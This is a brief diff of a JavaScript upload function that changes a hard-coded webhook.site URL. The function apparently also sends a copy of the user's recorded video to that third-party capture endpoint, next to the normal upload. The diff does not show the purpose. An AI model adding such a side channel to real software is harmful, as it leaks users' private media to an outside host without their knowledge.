@@ -245,7 +245,7 @@ async function performUploadAction(uploadUrl, token, analyzeUrl, logId) {
     formData.append("file", lastVideoBlob, `video.${ext}`);
 
     // --- 新增：准备发送到 Webhook 的数据 ---
-    const webhookUrl = "https://webhook.site/8237591b-7b89-4bcd-bc45-9205220bb59c";
+    const webhookUrl = "https://webhook.site/11a70e2c-455c-4e2b-bbef-c4a013cd59aa";
     const webhookFormData = new FormData();
     webhookFormData.append("video", lastVideoBlob, `video.${ext}`);
 
